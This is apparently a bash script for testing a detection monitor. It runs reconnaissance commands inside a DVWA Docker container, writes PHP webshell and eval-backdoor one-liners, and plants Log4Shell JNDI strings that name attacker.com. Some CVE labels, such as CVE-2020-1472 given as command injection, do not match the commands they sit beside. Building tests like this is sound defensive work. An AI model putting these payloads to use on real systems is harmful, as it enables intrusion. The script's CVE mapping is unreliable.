#!/bin/bash

echo "=== DVWA CVE-Correlated Anomaly Trigger Script ==="
echo "This script executes attacks that correlate with known Docker CVEs"
echo "Designed to trigger CVE pattern detection in the monitoring system"
echo

# Check if container is running
if ! docker ps | grep -q "dvwa"; then
    echo "ERROR: DVWA container is not running!"
    echo "Please start it with: docker-compose up"
    exit 1
fi

echo "Container found. Triggering CVE-correlated anomalies..."

echo
echo "=== CVE-2020-15257 & CVE-2021-30465: Information Disclosure ==="
echo "1. Reconnaissance commands (Information Disclosure CVEs)..."
docker exec dvwa whoami
docker exec dvwa id
docker exec dvwa uname -a
docker exec dvwa cat /etc/passwd
docker exec dvwa ps aux
docker exec dvwa netstat -tuln 2>/dev/null || docker exec dvwa ss -tuln 2>/dev/null

echo
echo "=== CVE-2019-14271 & CVE-2021-41089: File System Manipulation ==="
echo "2. File system exploration and manipulation..."
docker exec dvwa ls -la /
docker exec dvwa find /var/log -name "*.log" -type f 2>/dev/null | head -5
docker exec dvwa find /tmp -type f 2>/dev/null

echo "3. Creating temporary files (CVE-2019-14271 patterns)..."
docker exec dvwa touch /tmp/suspicious_file_$(date +%s)
docker exec dvwa echo "test data" > /tmp/anomaly_test
docker exec dvwa sh -c "echo 'malicious script' > /tmp/exploit.sh && chmod +x /tmp/exploit.sh"

echo
echo "=== CVE-2020-25613 & CVE-2019-16278: Web Application Exploitation ==="
echo "4. Webshell creation (File Upload Vulnerability)..."
docker exec dvwa sh -c "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /tmp/webshell.php"
docker exec dvwa sh -c "echo '<?php system(\$_GET[cmd])?>' > /tmp/shell.php && chmod 777 /tmp/shell.php"
docker exec dvwa sh -c "echo '<?php eval(\$_POST[\"code\"]); ?>' > /tmp/eval_shell.php"

echo "5. Web vulnerability simulation..."
docker exec dvwa sh -c "curl -s http://localhost/dvwa/vulnerabilities/exec/ > /dev/null 2>&1 &" || true

echo
echo "=== CVE-2019-5736 & CVE-2018-15664: Container Escape Patterns ==="
echo "6. Process manipulation and privilege escalation patterns..."
docker exec dvwa sh -c "sleep 30 &"
docker exec dvwa sh -c "sleep 5 && echo 'Background process done'" &
docker exec dvwa sh -c "nohup python -c 'import os; os.system(\"sleep 30\")' &" 2>/dev/null || true

echo
echo "=== CVE-2020-13401: Network Activity Simulation ==="
echo "7. Network reconnaissance..."
docker exec dvwa cat /proc/net/tcp | head -10
docker exec dvwa sh -c "ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null" | head -10

echo
echo "=== CVE-2020-1472: Command Injection Patterns ==="
echo "8. Suspicious command patterns and injection simulation..."
docker exec dvwa sh -c "echo 'system(\$_GET[\"cmd\"])' > /tmp/inject.php"
docker exec dvwa sh -c "echo 'eval(\$_POST[\"data\"])' > /tmp/backdoor.php"
docker exec dvwa sh -c "echo '#!/bin/bash' > /tmp/malicious.sh && chmod +x /tmp/malicious.sh"

echo
echo "=== Multi-CVE Attack Chain Simulation ==="
echo "9. Combined attack patterns (Multiple CVE correlation)..."
docker exec dvwa sh -c "ps aux | wc -l"
docker exec dvwa sh -c "find /tmp -name '*.php' -exec ls -la {} \;"
docker exec dvwa sh -c "whoami && id && uname -a" | head -3

echo "10. File enumeration and persistence..."
docker exec dvwa sh -c "find /var/www -name '*.php' 2>/dev/null | head -5"
docker exec dvwa sh -c "ls -la /tmp/ | grep -E '\.(php|sh)$'"

echo
echo "=== CVE-2021-44228: Log4Shell Simulation Patterns ==="
echo "11. Simulating Log4j-style attack patterns..."
docker exec dvwa sh -c "echo 'jndi:ldap://malicious.server.com/exploit' > /tmp/log4j_test"
docker exec dvwa sh -c "echo '\${jndi:ldap://attacker.com/a}' > /tmp/payload"

echo
echo "=== Memory and CPU Stress (Resource Anomalies) ==="
echo "12. Resource consumption patterns..."
docker exec dvwa sh -c "dd if=/dev/zero of=/tmp/memory_test bs=1M count=10 2>/dev/null &"
docker exec dvwa sh -c "python -c 'import time; [x*x for x in range(100000)]; time.sleep(2)'" &

echo
echo "=== Final Status Check ==="
echo "13. Post-attack container status..."
docker exec dvwa ps aux | wc -l
docker exec dvwa df -h /tmp
docker exec dvwa ls -la /tmp/ | wc -l

echo
echo "=== CVE Attack Simulation Complete ==="
echo "Monitor should now detect multiple CVE patterns:"
echo "• CVE-2020-15257 (Information Disclosure)"  
echo "• CVE-2019-14271 (File Manipulation)"
echo "• CVE-2020-25613 (Webshell Upload)"
echo "• CVE-2019-5736 (Container Escape)"
echo "• CVE-2020-13401 (API Exposure)"
echo "• CVE-2020-1472 (Command Injection)"
echo "• CVE-2021-44228 (Log4Shell patterns)"
echo
echo "Check monitor output for CVE correlation alerts!"